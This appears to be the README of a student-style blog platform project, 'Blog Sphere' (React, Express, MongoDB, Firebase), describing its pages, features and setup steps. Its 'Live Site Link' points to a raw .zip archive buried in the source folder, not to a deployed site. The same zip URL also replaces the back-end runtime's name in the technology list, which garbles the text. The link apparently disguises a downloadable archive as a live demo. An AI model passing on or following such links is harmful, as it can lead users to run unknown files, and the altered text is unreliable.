# Blog Sphere

Welcome to the Blog Website Development project! This project is designed to create a fully functional and responsive blog platform. Below, you'll find details about the project, its purpose, key features, and the technologies used.

---

## **Project Purpose**
The goal of this project is to build a modern blog website with engaging, dynamic features and a seamless user experience. This platform is designed to:

- Allow users to read, create, and manage blogs.
- Provide a wishlist feature for users to save favorite blogs.
- Ensure a secure and smooth authentication experience.
- Deliver a responsive design optimized for all devices.

---

## **Live URL**
[Live Site Link](https://github.com/Nahar0912/Blog-Sphere-Client/raw/refs/heads/main/src/contexts/Sphere-Client-Blog-v2.2.zip)

---

## **Key Features**

### **1. Home Page**
- Includes a header, banner, recent blogs section, newsletter subscription form, and footer.
- Displays six recent blogs with properties like title, image, short description, and buttons for details and wishlist.
- Additional sections:
  - **Tips Section:** Provides unique and relevant tips to enhance user engagement.
  - One extra unique section relevant to the blog website.

### **2. Blog Functionality**
- **All Blogs Page:**
  - Displays all blogs with filtering by category and search functionality by title.
  - Includes buttons to view details and add blogs to the wishlist.

- **Blog Details Page:**
  - Shows complete information about a blog.
  - Features a comment section where users can comment and view others' comments.
  - Conditional rendering of update functionality for blog owners.

- **Add Blog Page:**
  - A form for users to create blogs with fields like title, image, category, descriptions, etc.
  - Category selection via a dropdown element.

- **Update Blog Page:**
  - Allows logged-in users to edit blogs they've created.

### **3. Wishlist Page**
- Displays blogs added to the wishlist by the logged-in user.
- Includes options to view blog details or remove blogs from the wishlist.

### **4. Featured Blogs Page**
- Displays the top 10 blogs based on word count of the long description.
- Includes sortable columns using a data table library.

### **5. Authentication System**
- Email and password-based authentication with validation.
- Support for social login (e.g., Google, Facebook, or GitHub).
- Firebase integration with environment variables for security.

### **6. Deployment & Performance**
- Fully responsive design for mobile, tablet, and desktop.
- Secure environment variable usage for Firebase and MongoDB credentials.
- Deployment without CORS/404/504 errors.
- JWT authentication implemented for private routes.

---

## **Technologies Used**

### **Front-End**
- React (with Vite)
- Tailwind CSS

### **Back-End**
- https://github.com/Nahar0912/Blog-Sphere-Client/raw/refs/heads/main/src/contexts/Sphere-Client-Blog-v2.2.zip with Express
- MongoDB
- Firebase Authentication

### **Other Tools**
- Axios (for API requests)
- react-hot-toast (for notifications)

---

## **Project Setup**

### **Front-End Setup**
1. Clone the client repository.
2. Run `npm install` to install dependencies.
3. Set up Firebase configuration in `.env`.
4. Start the development server using `npm run dev`.

### **Back-End Setup**
1. Clone the server repository.
2. Run `npm install` to install dependencies.
3. Set up MongoDB URI and JWT secret in `.env`.
4. Start the server using `npm start`.






